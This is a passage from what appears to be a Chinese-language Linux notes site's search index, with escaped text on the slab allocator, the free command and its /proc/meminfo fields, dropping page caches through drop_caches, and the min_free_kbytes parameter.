\u5185\u7684\u5bf9\u8c61\u6570\u91cf\u53d6\u51b3\u4e8e\u76f8\u5173 slab \u7684\u5927\u5c0f\u3002\u4f8b\u5982\uff0c12KB slab\uff08\u7531 3 \u4e2a\u8fde\u7eed\u7684 4KB \u9875\u9762\u7ec4\u6210\uff09\u53ef\u4ee5\u5b58\u50a8 6 \u4e2a 2KB \u5bf9\u8c61\u3002\u6700\u521d\uff0ccache \u5185\u7684\u6240\u6709\u5bf9\u8c61\u90fd\u6807\u8bb0\u4e3a\u7a7a\u95f2\u3002\u5f53\u9700\u8981\u5185\u6838\u6570\u636e\u7ed3\u6784\u7684\u65b0\u5bf9\u8c61\u65f6\uff0c\u5206\u914d\u5668\u53ef\u4ee5\u4ece cache \u4e0a\u5206\u914d\u4efb\u4f55\u7a7a\u95f2\u5bf9\u8c61\u4ee5\u4fbf\u6ee1\u8db3\u8bf7\u6c42\u3002\u4ece cache \u4e0a\u5206\u914d\u7684\u5bf9\u8c61\u6807\u8bb0\u4e3a used\uff08\u4f7f\u7528\uff09\u3002 \u8ba9\u6211\u4eec\u8003\u8651\u4e00\u4e2a\u573a\u666f\uff0c\u8fd9\u91cc\u5185\u6838\u4e3a\u8868\u793a\u8fdb\u7a0b\u63cf\u8ff0\u7b26\u7684\u5bf9\u8c61\u4ece slab \u5206\u914d\u5668\u8bf7\u6c42\u5185\u5b58\u3002\u5728 Linux \u7cfb\u7edf\u4e2d\uff0c\u8fdb\u7a0b\u63cf\u8ff0\u7b26\u5c5e\u4e8e struct task_struct \u7c7b\u578b\uff0c\u5b83\u9700\u8981\u5927\u7ea6 1.7KB \u7684\u5185\u5b58\u3002\u5f53 Linux \u5185\u6838\u521b\u5efa\u4e00\u4e2a\u65b0\u4efb\u52a1\u65f6\uff0c\u5b83\u4ece cache \u4e2d\u8bf7\u6c42 struct task_struct \u5bf9\u8c61\u7684\u5fc5\u8981\u5185\u5b58\u3002cache \u5229\u7528\u5df2\u7ecf\u5728 slab \u4e2d\u5206\u914d\u7684\u5e76\u4e14\u6807\u8bb0\u4e3a free (\u7a7a\u95f2\uff09\u7684 struct task_struct \u5bf9\u8c61\u6765\u6ee1\u8db3\u8bf7\u6c42\u3002 \u5728 Linux \u4e2d\uff0cslab \u53ef\u4ee5\u5904\u4e8e\u4e09\u79cd\u53ef\u80fd\u72b6\u6001\u4e4b\u4e00\uff1a \u6ee1\u7684\uff1aslab \u7684\u6240\u6709\u5bf9\u8c61\u6807\u8bb0\u4e3a\u4f7f\u7528\u3002 \u7a7a\u7684\uff1aslab \u4e0a\u7684\u6240\u6709\u5bf9\u8c61\u6807\u8bb0\u4e3a\u7a7a\u95f2\u3002 \u90e8\u5206\uff1aslab \u4e0a\u7684\u5bf9\u8c61\u6709\u7684\u6807\u8bb0\u4e3a\u4f7f\u7528\uff0c\u6709\u7684\u6807\u8bb0\u4e3a\u7a7a\u95f2\u3002 slab \u5206\u914d\u5668\u9996\u5148\u5c1d\u8bd5\u5728\u90e8\u5206\u4e3a\u7a7a\u7684 slab \u4e2d\u7528\u7a7a\u95f2\u5bf9\u8c61\u6765\u6ee1\u8db3\u8bf7\u6c42\u3002\u5982\u679c\u4e0d\u5b58\u5728\uff0c\u5219\u4ece\u7a7a\u7684 slab \u4e2d\u5206\u914d\u7a7a\u95f2\u5bf9\u8c61\u3002\u5982\u679c\u6ca1\u6709\u7a7a\u7684 slab \u53ef\u7528\uff0c\u5219\u4ece\u8fde\u7eed\u7269\u7406\u9875\u9762\u5206\u914d\u65b0\u7684 slab\uff0c\u5e76\u5c06\u5176\u5206\u914d\u7ed9 cache\uff1b\u4ece\u8fd9\u4e2a slab \u4e0a\uff0c\u518d\u5206\u914d\u5bf9\u8c61\u5185\u5b58\u3002 slab \u5206\u914d\u5668\u63d0\u4f9b\u4e24\u4e2a\u4e3b\u8981\u4f18\u70b9\uff1a \u6ca1\u6709\u56e0\u788e\u7247\u800c\u5f15\u8d77\u5185\u5b58\u6d6a\u8d39\u3002\u788e\u7247\u4e0d\u662f\u95ee\u9898\uff0c\u56e0\u4e3a\u6bcf\u4e2a\u5185\u6838\u6570\u636e\u7ed3\u6784\u90fd\u6709\u5173\u8054\u7684 cache\uff0c\u6bcf\u4e2a cache \u90fd\u7531\u4e00\u4e2a\u6216\u591a\u4e2a slab \u7ec4\u6210\uff0c\u800c slab \u6309\u6240\u8868\u793a\u5bf9\u8c61\u7684\u5927\u5c0f\u6765\u5206\u5757\u3002\u56e0\u6b64\uff0c\u5f53\u5185\u6838\u8bf7\u6c42\u5bf9\u8c61\u5185\u5b58\u65f6\uff0cslab \u5206\u914d\u5668\u53ef\u4ee5\u8fd4\u56de\u521a\u597d\u8868\u793a\u5bf9\u8c61\u7684\u6240\u9700\u5185\u5b58\u3002 \u53ef\u4ee5\u5feb\u901f\u6ee1\u8db3\u5185\u5b58\u8bf7\u6c42\u3002\u56e0\u6b64\uff0c\u5f53\u5bf9\u8c61\u9891\u7e41\u5730\u88ab\u5206\u914d\u548c\u91ca\u653e\u65f6\uff0c\u5982\u6765\u81ea\u5185\u6838\u8bf7\u6c42\u7684\u60c5\u51b5\uff0cslab \u5206\u914d\u65b9\u6848\u5728\u7ba1\u7406\u5185\u5b58\u65f6\u7279\u522b\u6709\u6548\u3002\u5206\u914d\u548c\u91ca\u653e\u5185\u5b58\u7684\u52a8\u4f5c\u53ef\u80fd\u662f\u4e00\u4e2a\u8017\u65f6\u8fc7\u7a0b\u3002\u7136\u800c\uff0c\u7531\u4e8e\u5bf9\u8c61\u5df2\u9884\u5148\u521b\u5efa\uff0c\u56e0\u6b64\u53ef\u4ee5\u4ece cache \u4e2d\u5feb\u901f\u5206\u914d\u3002\u518d\u8005\uff0c\u5f53\u5185\u6838\u7528\u5b8c\u5bf9\u8c61\u5e76\u91ca\u653e\u5b83\u65f6\uff0c\u5b83\u88ab\u6807\u8bb0\u4e3a\u7a7a\u95f2\u5e76\u8fd4\u56de\u5230 cache\uff0c\u4ece\u800c\u7acb\u5373\u53ef\u7528\u4e8e\u540e\u7eed\u7684\u5185\u6838\u8bf7\u6c42\u3002 slab \u5206\u914d\u5668\u9996\u5148\u51fa\u73b0\u5728 Solaris 2.4 \u5185\u6838\u4e2d\u3002\u7531\u4e8e\u901a\u7528\u6027\u8d28\uff0cSolaris \u73b0\u5728\u4e5f\u5c06\u8fd9\u79cd\u5206\u914d\u5668\u7528\u4e8e\u67d0\u4e9b\u7528\u6237\u6a21\u5f0f\u7684\u5185\u5b58\u8bf7\u6c42\u3002\u6700\u521d\uff0cLinux \u4f7f\u7528\u7684\u662f\u4f19\u4f34\u7cfb\u7edf\uff1b\u7136\u800c\uff0c\u4ece\u7248\u672c 2.2 \u5f00\u59cb\uff0cLinux \u5185\u6838\u91c7\u7528 slab \u5206\u914d\u5668\u3002 \u73b0\u5728\uff0c\u6700\u8fd1\u53d1\u5e03\u7684 Linux \u4e5f\u5305\u62ec\u53e6\u5916\u4e24\u4e2a\u5185\u6838\u5185\u5b58\u5206\u914d\u5668\uff0cSLOB \u548c SLUB \u5206\u914d\u5668\uff08Linux \u5c06 slab \u5b9e\u73b0\u79f0\u4e3a SLAB\uff09\u3002 \u7b80\u5355\u5757\u5217\u8868\uff08SLOB\uff09\u5206\u914d\u5668\u7528\u4e8e\u6709\u9650\u5185\u5b58\u7684\u7cfb\u7edf\uff0c\u4f8b\u5982\u5d4c\u5165\u5f0f\u7cfb\u7edf\u3002SLOB \u5de5\u4f5c\u91c7\u7528 3 \u4e2a\u5bf9\u8c61\u5217\u8868\uff1a\u5c0f\uff08\u7528\u4e8e\u5c0f\u4e8e 256 \u5b57\u8282\u7684\u5bf9\u8c61\uff09\u3001\u4e2d\uff08\u7528\u4e8e\u5c0f\u4e8e 1024 \u5b57\u8282\u7684\u5bf9\u8c61\uff09\u548c\u5927\uff08\u7528\u4e8e\u5c0f\u4e8e\u9875\u9762\u5927\u5c0f\u7684\u5bf9\u8c61\uff09\u3002\u5185\u5b58\u8bf7\u6c42\u91c7\u7528\u9996\u5148\u9002\u5e94\u7b56\u7565\uff0c\u4ece\u9002\u5f53\u5927\u5c0f\u7684\u5217\u8868\u4e0a\u5206\u914d\u5bf9\u8c61\u3002 \u4ece\u7248\u672c 2.6.24 \u5f00\u59cb\uff0cSLUB \u5206\u914d\u5668\u53d6\u4ee3 SLAB\uff0c\u6210\u4e3a Linux \u5185\u6838\u7684\u9ed8\u8ba4\u5206\u914d\u5668\u3002SLUB \u901a\u8fc7\u51cf\u5c11 SLAB \u5206\u914d\u5668\u6240\u9700\u7684\u5927\u91cf\u5f00\u9500\uff0c\u6765\u89e3\u51b3 slab \u5206\u914d\u7684\u6027\u80fd\u95ee\u9898\uff0c\u4e00\u4e2a\u6539\u53d8\u662f\uff0c\u5728 SLAB \u5206\u914d\u4e0b\u6bcf\u4e2a slab \u5b58\u50a8\u7684\u5143\u6570\u636e\uff0c\u79fb\u5230 Linux \u5185\u6838\u7528\u4e8e\u6bcf\u4e2a\u9875\u9762\u7684\u7ed3\u6784 page\u3002\u6b64\u5916\uff0c\u5bf9\u4e8e SLAB \u5206\u914d\u5668\uff0c\u6bcf\u4e2a CPU \u90fd\u6709\u961f\u5217\u4ee5\u7ef4\u62a4\u6bcf\u4e2a cache \u5185\u7684\u5bf9\u8c61\uff0cSLUB \u4f1a\u5220\u9664\u8fd9\u4e9b\u961f\u5217\u3002 \u5bf9\u4e8e\u5177\u6709\u5927\u91cf\u5904\u7406\u5668\u7684\u7cfb\u7edf\uff0c\u5206\u914d\u7ed9\u8fd9\u4e9b\u961f\u5217\u7684\u5185\u5b58\u91cf\u662f\u5f88\u91cd\u8981\u7684\u3002\u56e0\u6b64\uff0c\u968f\u7740\u7cfb\u7edf\u5904\u7406\u5668\u6570\u91cf\u7684\u589e\u52a0\uff0cSLUB \u6027\u80fd\u4e5f\u66f4\u597d\u3002","title":"slab\u5206\u914d"},{"location":"system/linux/%E5%86%85%E5%AD%98/free/","text":"free\u547d\u4ee4 \u8bed\u6cd5\u683c\u5f0f\uff1a free [\u9009\u9879] \u5e38\u7528\u53c2\u6570\uff1a \ufeff -b, --bytes --\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u663e\u793a\u8f93\u51fa -k, --kilo --\u4ee5\u5343\u5b57\u8282\u4e3a\u5355\u4f4d\u663e\u793a\u8f93\u51fa -m, --mega --\u4ee5\u5146\u5b57\u8282\u4e3a\u5355\u4f4d\u663e\u793a\u8f93\u51fa -g, --giga --\u5343\u5146\u663e\u793a\u8f93\u51fa\uff08GB\uff09 --tera --TB\u4e3a\u5355\u4f4d\u663e\u793a\u8f93\u51fa --peta --PB\u4e3a\u5355\u4f4d\u663e\u793a\u8f93\u51fa -h, --human --\u4eba\u7c7b\u663e\u793a\u4eba\u7c7b\u53ef\u8bfb\u7684\u8f93\u51fa --si --\u4f7f\u75281000\u800c\u975e1024\u7684\u8fdb\u5236 -l, --lohi --\u663e\u793a\u8be6\u7ec6\u7684\u4f4e\u5185\u5b58\u548c\u9ad8\u5185\u5b58\u7edf\u8ba1\u4fe1\u606f -t, --total --\u663e\u793aRAM+\u4ea4\u6362\u7684\u603b\u8ba1 -s N, --seconds N --\u6bcfN\u79d2\u91cd\u590d\u6253\u5370\u4e00\u6b21 -c N, --count N --\u91cd\u590d\u6253\u5370N\u6b21\uff0c\u7136\u540e\u9000\u51fa -w, --wide --\u5bbd\u8f93\u51fa --help --\u663e\u793a\u5e2e\u52a9 -V, --version --\u663e\u793a\u7248\u672c \u663e\u793a\u7684\u89e3\u91ca total \u5185\u5b58\u603b\u548c (MemTotal and SwapTotal in /proc/meminfo) used \u5df2\u7ecf\u4f7f\u7528\u7684\u5185\u5b58 (\u901a\u8fc7total - free - buffers - cache \u6765\u8ba1\u7b97) free \u672a\u4f7f\u7528\u7684\u5185\u5b58 (MemFree and SwapFree in /proc/meminfo) shared tmpfs\uff08\u4e3b\u8981\uff09\u4f7f\u7528\u7684\u5185\u5b58 (Shmem in /proc/meminfo) buffers Buffers \u662f\u5185\u6838\u7f13\u51b2\u533a\u7528\u5230\u7684\u5185\u5b58\uff0c\u5bf9\u5e94\u7684\u662f /proc/meminfo \u4e2d\u7684 Buffers \u503c\u3002(Buffers in /proc/meminfo) cache Cache \u662f\u5185\u6838\u9875\u7f13\u5b58\u548c Slab \u7528\u5230\u7684\u5185\u5b58\uff0c\u5bf9\u5e94\u7684\u662f /proc/meminfo \u4e2d\u7684 Cached \u4e0e SReclaimable \u4e4b\u548c\u3002(Cached and SReclaimable in /proc/meminfo) \u7248\u672c\uff1aprocps-3.2.8-36 cache\u503c\u7b49\u4e8e/proc/meminfo\u4e2d\u7684\u201dCached\u201d\uff1b \u7248\u672c\uff1aprocps-3.3.9-10.1 cache\u503c\u7b49\u4e8e/proc/meminfo\u7684 [Cached + SReclaimable]\uff1b \u7248\u672c\uff1aprocps-ng-3.3.10-3 cache\u503c\u7b49\u4e8e/proc/meminfo\u7684 [Cached + Slab]\u3002 buff/cache buffers \u548c cache \u7684\u548c available \u542f\u52a8\u65b0\u5e94\u7528\u7a0b\u5e8f\u7684\u53ef\u7528\u5185\u5b58\u91cf\u3002\u4e0e\u201c\u7f13\u5b58\u201d\u6216\u201c\u53ef\u7528\u201d\u5b57\u6bb5\u63d0\u4f9b\u7684\u6570\u636e\u4e0d\u540c\uff0c\u6b64\u5b57\u6bb5\u8003\u8651\u4e86\u9875\u9762\u7f13\u5b58\u3002\u5728kernels 3.14\u4e0a\u5bf9\u5e94 MemAvailable in/proc/meminfo\uff0c\u5728kernels 2.6.27+\u4e0a\u548cfree\u76f8\u540c Buffers \u662f\u5bf9\u539f\u59cb\u78c1\u76d8\u5757\u7684\u4e34\u65f6\u5b58\u50a8\uff0c\u4e5f\u5c31\u662f\u7528\u6765\u7f13\u5b58\u78c1\u76d8\u7684\u6570\u636e\uff0c\u901a\u5e38\u4e0d\u4f1a\u7279\u522b\u5927\uff0820MB \u5de6\u53f3\uff09\u3002\u8fd9\u6837\uff0c\u5185\u6838\u5c31\u53ef\u4ee5\u628a\u5206\u6563\u7684\u5199\u96c6\u4e2d\u8d77\u6765\uff0c\u7edf\u4e00\u4f18\u5316\u78c1\u76d8\u7684\u5199\u5165\uff0c\u6bd4\u5982\u53ef\u4ee5\u628a\u591a\u6b21\u5c0f\u7684\u5199\u5408\u5e76\u6210\u5355\u6b21\u5927\u7684\u5199\u7b49\u7b49\u3002 Cached \u662f\u4ece\u78c1\u76d8\u8bfb\u53d6\u6587\u4ef6\u7684\u9875\u7f13\u5b58\uff0c\u4e5f\u5c31\u662f\u7528\u6765\u7f13\u5b58\u4ece\u6587\u4ef6\u8bfb\u53d6\u7684\u6570\u636e\u3002\u8fd9\u6837\uff0c\u4e0b\u6b21\u8bbf\u95ee\u8fd9\u4e9b\u6587\u4ef6\u6570\u636e\u65f6\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u4ece\u5185\u5b58\u4e2d\u5feb\u901f\u83b7\u53d6\uff0c\u800c\u4e0d\u9700\u8981\u518d\u6b21\u8bbf\u95ee\u7f13\u6162\u7684\u78c1\u76d8\u3002 SReclaimable \u662f Slab \u7684\u4e00\u90e8\u5206\u3002Slab \u5305\u62ec\u4e24\u90e8\u5206\uff0c\u5176\u4e2d\u7684\u53ef\u56de\u6536\u90e8\u5206\uff0c\u7528 SReclaimable \u8bb0\u5f55\uff1b\u800c\u4e0d\u53ef\u56de\u6536\u90e8\u5206\uff0c\u7528 SUnreclaim \u8bb0\u5f55\u3002 Buffer \u65e2\u53ef\u4ee5\u7528\u4f5c\u201c\u5c06\u8981\u5199\u5165\u78c1\u76d8\u6570\u636e\u7684\u7f13\u5b58\u201d\uff0c\u4e5f\u53ef\u4ee5\u7528\u4f5c\u201c\u4ece\u78c1\u76d8\u8bfb\u53d6\u6570\u636e\u7684\u7f13\u5b58\u201d\u3002 Cache \u65e2\u53ef\u4ee5\u7528\u4f5c\u201c\u4ece\u6587\u4ef6\u8bfb\u53d6\u6570\u636e\u7684\u9875\u7f13\u5b58\u201d\uff0c\u4e5f\u53ef\u4ee5\u7528\u4f5c\u201c\u5199\u6587\u4ef6\u7684\u9875\u7f13\u5b58\u201d\u3002 \u7b80\u5355\u6765\u8bf4\uff0cBuffer \u662f\u5bf9\u78c1\u76d8\u6570\u636e\u7684\u7f13\u5b58\uff0c\u800c Cache \u662f\u6587\u4ef6\u6570\u636e\u7684\u7f13\u5b58\uff0c\u5b83\u4eec\u65e2\u4f1a\u7528\u5728\u8bfb\u8bf7\u6c42\u4e2d\uff0c\u4e5f\u4f1a\u7528\u5728\u5199\u8bf7\u6c42\u4e2d\u3002 \u91ca\u653e\u9875\u7f13\u5b58: echo 1 > /proc/sys/vm/drop_caches \u91ca\u653eslab\u5bf9\u8c61 (\u5305\u542b dentries \u548c inodes): echo 2 > /proc/sys/vm/drop_caches \u91ca\u653eslab\u5bf9\u8c61\u548c\u9875\u7f13\u5b58: echo 3 > /proc/sys/vm/drop_caches \u7531\u4e8e\u5199\u5165\u6b64\u6587\u4ef6\u662f\u4e00\u79cd\u975e\u7834\u574f\u6027\u64cd\u4f5c\uff0c\u4e14\u810f\u5bf9\u8c61\u65e0\u6cd5\u91ca\u653e\uff0c\u56e0\u6b64\u7528\u6237\u5e94\u5148\u8fd0\u884csync https://man7.org/linux/man-pages/man1/free.1.html","title":"free\u547d\u4ee4"},{"location":"system/linux/%E5%86%85%E5%AD%98/free/#free","text":"\u8bed\u6cd5\u683c\u5f0f\uff1a free [\u9009\u9879] \u5e38\u7528\u53c2\u6570\uff1a \ufeff -b, --bytes --\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u663e\u793a\u8f93\u51fa -k, --kilo --\u4ee5\u5343\u5b57\u8282\u4e3a\u5355\u4f4d\u663e\u793a\u8f93\u51fa -m, --mega --\u4ee5\u5146\u5b57\u8282\u4e3a\u5355\u4f4d\u663e\u793a\u8f93\u51fa -g, --giga --\u5343\u5146\u663e\u793a\u8f93\u51fa\uff08GB\uff09 --tera --TB\u4e3a\u5355\u4f4d\u663e\u793a\u8f93\u51fa --peta --PB\u4e3a\u5355\u4f4d\u663e\u793a\u8f93\u51fa -h, --human --\u4eba\u7c7b\u663e\u793a\u4eba\u7c7b\u53ef\u8bfb\u7684\u8f93\u51fa --si --\u4f7f\u75281000\u800c\u975e1024\u7684\u8fdb\u5236 -l, --lohi --\u663e\u793a\u8be6\u7ec6\u7684\u4f4e\u5185\u5b58\u548c\u9ad8\u5185\u5b58\u7edf\u8ba1\u4fe1\u606f -t, --total --\u663e\u793aRAM+\u4ea4\u6362\u7684\u603b\u8ba1 -s N, --seconds N --\u6bcfN\u79d2\u91cd\u590d\u6253\u5370\u4e00\u6b21 -c N, --count N --\u91cd\u590d\u6253\u5370N\u6b21\uff0c\u7136\u540e\u9000\u51fa -w, --wide --\u5bbd\u8f93\u51fa --help --\u663e\u793a\u5e2e\u52a9 -V, --version --\u663e\u793a\u7248\u672c \u663e\u793a\u7684\u89e3\u91ca total \u5185\u5b58\u603b\u548c (MemTotal and SwapTotal in /proc/meminfo) used \u5df2\u7ecf\u4f7f\u7528\u7684\u5185\u5b58 (\u901a\u8fc7total - free - buffers - cache \u6765\u8ba1\u7b97) free \u672a\u4f7f\u7528\u7684\u5185\u5b58 (MemFree and SwapFree in /proc/meminfo) shared tmpfs\uff08\u4e3b\u8981\uff09\u4f7f\u7528\u7684\u5185\u5b58 (Shmem in /proc/meminfo) buffers Buffers \u662f\u5185\u6838\u7f13\u51b2\u533a\u7528\u5230\u7684\u5185\u5b58\uff0c\u5bf9\u5e94\u7684\u662f /proc/meminfo \u4e2d\u7684 Buffers \u503c\u3002(Buffers in /proc/meminfo) cache Cache \u662f\u5185\u6838\u9875\u7f13\u5b58\u548c Slab \u7528\u5230\u7684\u5185\u5b58\uff0c\u5bf9\u5e94\u7684\u662f /proc/meminfo \u4e2d\u7684 Cached \u4e0e SReclaimable \u4e4b\u548c\u3002(Cached and SReclaimable in /proc/meminfo) \u7248\u672c\uff1aprocps-3.2.8-36 cache\u503c\u7b49\u4e8e/proc/meminfo\u4e2d\u7684\u201dCached\u201d\uff1b \u7248\u672c\uff1aprocps-3.3.9-10.1 cache\u503c\u7b49\u4e8e/proc/meminfo\u7684 [Cached + SReclaimable]\uff1b \u7248\u672c\uff1aprocps-ng-3.3.10-3 cache\u503c\u7b49\u4e8e/proc/meminfo\u7684 [Cached + Slab]\u3002 buff/cache buffers \u548c cache \u7684\u548c available \u542f\u52a8\u65b0\u5e94\u7528\u7a0b\u5e8f\u7684\u53ef\u7528\u5185\u5b58\u91cf\u3002\u4e0e\u201c\u7f13\u5b58\u201d\u6216\u201c\u53ef\u7528\u201d\u5b57\u6bb5\u63d0\u4f9b\u7684\u6570\u636e\u4e0d\u540c\uff0c\u6b64\u5b57\u6bb5\u8003\u8651\u4e86\u9875\u9762\u7f13\u5b58\u3002\u5728kernels 3.14\u4e0a\u5bf9\u5e94 MemAvailable in/proc/meminfo\uff0c\u5728kernels 2.6.27+\u4e0a\u548cfree\u76f8\u540c Buffers \u662f\u5bf9\u539f\u59cb\u78c1\u76d8\u5757\u7684\u4e34\u65f6\u5b58\u50a8\uff0c\u4e5f\u5c31\u662f\u7528\u6765\u7f13\u5b58\u78c1\u76d8\u7684\u6570\u636e\uff0c\u901a\u5e38\u4e0d\u4f1a\u7279\u522b\u5927\uff0820MB \u5de6\u53f3\uff09\u3002\u8fd9\u6837\uff0c\u5185\u6838\u5c31\u53ef\u4ee5\u628a\u5206\u6563\u7684\u5199\u96c6\u4e2d\u8d77\u6765\uff0c\u7edf\u4e00\u4f18\u5316\u78c1\u76d8\u7684\u5199\u5165\uff0c\u6bd4\u5982\u53ef\u4ee5\u628a\u591a\u6b21\u5c0f\u7684\u5199\u5408\u5e76\u6210\u5355\u6b21\u5927\u7684\u5199\u7b49\u7b49\u3002 Cached \u662f\u4ece\u78c1\u76d8\u8bfb\u53d6\u6587\u4ef6\u7684\u9875\u7f13\u5b58\uff0c\u4e5f\u5c31\u662f\u7528\u6765\u7f13\u5b58\u4ece\u6587\u4ef6\u8bfb\u53d6\u7684\u6570\u636e\u3002\u8fd9\u6837\uff0c\u4e0b\u6b21\u8bbf\u95ee\u8fd9\u4e9b\u6587\u4ef6\u6570\u636e\u65f6\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u4ece\u5185\u5b58\u4e2d\u5feb\u901f\u83b7\u53d6\uff0c\u800c\u4e0d\u9700\u8981\u518d\u6b21\u8bbf\u95ee\u7f13\u6162\u7684\u78c1\u76d8\u3002 SReclaimable \u662f Slab \u7684\u4e00\u90e8\u5206\u3002Slab \u5305\u62ec\u4e24\u90e8\u5206\uff0c\u5176\u4e2d\u7684\u53ef\u56de\u6536\u90e8\u5206\uff0c\u7528 SReclaimable \u8bb0\u5f55\uff1b\u800c\u4e0d\u53ef\u56de\u6536\u90e8\u5206\uff0c\u7528 SUnreclaim \u8bb0\u5f55\u3002 Buffer \u65e2\u53ef\u4ee5\u7528\u4f5c\u201c\u5c06\u8981\u5199\u5165\u78c1\u76d8\u6570\u636e\u7684\u7f13\u5b58\u201d\uff0c\u4e5f\u53ef\u4ee5\u7528\u4f5c\u201c\u4ece\u78c1\u76d8\u8bfb\u53d6\u6570\u636e\u7684\u7f13\u5b58\u201d\u3002 Cache \u65e2\u53ef\u4ee5\u7528\u4f5c\u201c\u4ece\u6587\u4ef6\u8bfb\u53d6\u6570\u636e\u7684\u9875\u7f13\u5b58\u201d\uff0c\u4e5f\u53ef\u4ee5\u7528\u4f5c\u201c\u5199\u6587\u4ef6\u7684\u9875\u7f13\u5b58\u201d\u3002 \u7b80\u5355\u6765\u8bf4\uff0cBuffer \u662f\u5bf9\u78c1\u76d8\u6570\u636e\u7684\u7f13\u5b58\uff0c\u800c Cache \u662f\u6587\u4ef6\u6570\u636e\u7684\u7f13\u5b58\uff0c\u5b83\u4eec\u65e2\u4f1a\u7528\u5728\u8bfb\u8bf7\u6c42\u4e2d\uff0c\u4e5f\u4f1a\u7528\u5728\u5199\u8bf7\u6c42\u4e2d\u3002 \u91ca\u653e\u9875\u7f13\u5b58: echo 1 > /proc/sys/vm/drop_caches \u91ca\u653eslab\u5bf9\u8c61 (\u5305\u542b dentries \u548c inodes): echo 2 > /proc/sys/vm/drop_caches \u91ca\u653eslab\u5bf9\u8c61\u548c\u9875\u7f13\u5b58: echo 3 > /proc/sys/vm/drop_caches \u7531\u4e8e\u5199\u5165\u6b64\u6587\u4ef6\u662f\u4e00\u79cd\u975e\u7834\u574f\u6027\u64cd\u4f5c\uff0c\u4e14\u810f\u5bf9\u8c61\u65e0\u6cd5\u91ca\u653e\uff0c\u56e0\u6b64\u7528\u6237\u5e94\u5148\u8fd0\u884csync https://man7.org/linux/man-pages/man1/free.1.html","title":"free\u547d\u4ee4"},{"location":"system/linux/%E5%86%85%E5%AD%98/min_free_kbytes%E5%8F%82%E6%95%B0/","text":"min_free_kbytes\u53c2\u6570\u6df1\u5165\u89e3\u6790\u53ca\u4f18\u5316 min_free_kbytes\u8fd9\u4e2a\u53c2\u6570\uff0c\u76f8\u4fe1\u5f88\u591a\u540c\u5b66\u90fd\u542c\u8bf4\u8fc7\u3002\u7ed9\u7cfb\u7edf\u9884\u7559\u7684\u6700\u4f4e\u5185\u5b58\u6570\u3002\u4f46\u662f\u8fd9\u4e2a\u8bf4\u6cd5\u592a\u6cdb\u6cdb\u4e86\uff0c\u4e0d\u80fd\u5b8c\u5168\u8bf4\u6e05\u695a\u8fd9\u4e2a\u53c2\u6570\u7684\u5b9e\u9645\u610f\u4e49\u3002 \u5185\u6838\u6709\u4e00\u6574\u5957\u7684\u5185\u5b58\u7ba1\u7406\u7684\u7cfb\u7edf\uff1a \u4e00\u65b9\u9762\u8981\u4fdd\u8bc1\u6027\u80fd\uff08\u8ba9\u7528\u6237\u7533\u8bf7\u5185\u5b58\u5c3d\u53ef\u80fd\u5feb\uff09 \u4e00\u65b9\u9762\u8981\u786e\u4fdd\u7a33\u5b9a\uff08\u7d27\u6025\u65f6\u523b\u6709\u5185\u5b58\u4fdd\u547d\uff09 \u9700\u8981\u5728\u4e24\u8005\u4e4b\u95f4\u505a\u5747\u8861\u3002 \u5185\u5b58\u7533\u8bf7\u65f6\uff0c\u6709\u5f88\u591a\u79cd\u7c7b\u578b\uff0c\u6709\u5404\u79cdflag\u63cf\u8ff0\u5185\u5b58\u7533\u8bf7\u7684\u7b56\u7565\uff0c\u4e3a\u4e86\u66f4\u597d\u5730\u63cf\u8ff0\uff0c\u8fd9\u91cc\u6211\u7b80\u5355\u5c31\u5f52\u4e3a2\u7c7b\uff1a \u53ef\u4ee5\u63a5\u53d7\u7b49\u5f85\uff0c\u5185\u5b58\u4e0d\u8db3\u65f6\uff0c\u7b49\u5f85\u5185\u5b58\u56de\u6536\uff0c\u76f4\u5230\u7533\u8bf7\u5230\u4e3a\u6b62\u3002 \u4e0d\u53ef\u63a5\u53d7\u7b49\u5f85\uff0c\u5185\u5b58\u4e0d\u8db3\u65f6\uff0c\u76f4\u63a5\u5931\u8d25\u3002 \u666e\u901a\u7684\u7528\u6237\u6001\u7a0b\u5e8f\u7533\u8bf7\u5185\u5b58\u90fd\u662f\u7b2c\u4e00\u7c7b\uff0c\u5f53\u5185\u5b58\u4e0d\u8db3\u65f6\uff0c\u53ef\u80fd\u4f1a\u7531\u4e8e\u9700\u8981\u89e6\u53d1\u56de\u6536\u800c\u5bfc\u81f4\u7533\u8bf7\u8fc7\u7a0b\u7684\u65f6\u95f4\u53d8\u957f\u5f71\u54cd\u5230\u6027\u80fd\u3002 \u4e00\u4e9b\u5185\u6838\u6001\u7d27\u6025\u7684\u5185\u5b58\u7533\u8bf7\uff0c\u5e38\u89c1\u7684\u5982\u7f51\u7edc\u6536\u53d1\u5305\u9636\u6bb5\uff0c\u5f88\u591a\u5185\u5b58\u7533\u8bf7\u90fd\u662f\u4e0d\u53ef\u7b49\u5f85\u7684\uff0c\u4e00\u65e6\u5185\u5b58\u4e0d\u8db3\uff0c\u5c31\u62a5\u5931\u8d25\uff0c\u8868\u73b0\u5c31\u53ef\u80fd\u662f\u4e22\u5305\uff0c\u751a\u81f3\u66f4\u52a0\u4e25\u91cd\u3002 \u56e0\u6b64\uff0c\u5185\u6838\u4f1a\u5c3d\u53ef\u80fd\u786e\u4fdd\u4e00\u90e8\u5206\u5185\u5b58\u662f\u7a7a\u95f2\u7684\uff0c\u7ed9\u7b2c\u4e8c\u7c7b\u5185\u5b58\u7533\u8bf7\u4f7f\u7528\u3002\u786e\u4fdd\u6574\u4e2a\u7cfb\u7edf\u7a33\u5b9a\u3002\u8fd9\u90e8\u5206\u5185\u5b58\u5c31\u5c31\u662fmin_free_kbytes\u53c2\u6570\u63a7\u5236\u7684\u3002\u518d\u60f3\u4e00\u4e0b\uff0c\u5c31\u4f1a\u6709\u8fd9\u6837\u7684\u7591\u95ee\uff1a\u5982\u4f55\u505a\u5230\u5c06\u8fd9\u4e48\u591a\u7684\u5185\u5b58\u7a7a\u51fa\u6765\u5462\uff1f\u8fd9\u5c31\u6d89\u53ca\u5230\u5185\u5b58\u7684\u56de\u6536\u7b56\u7565\u3002 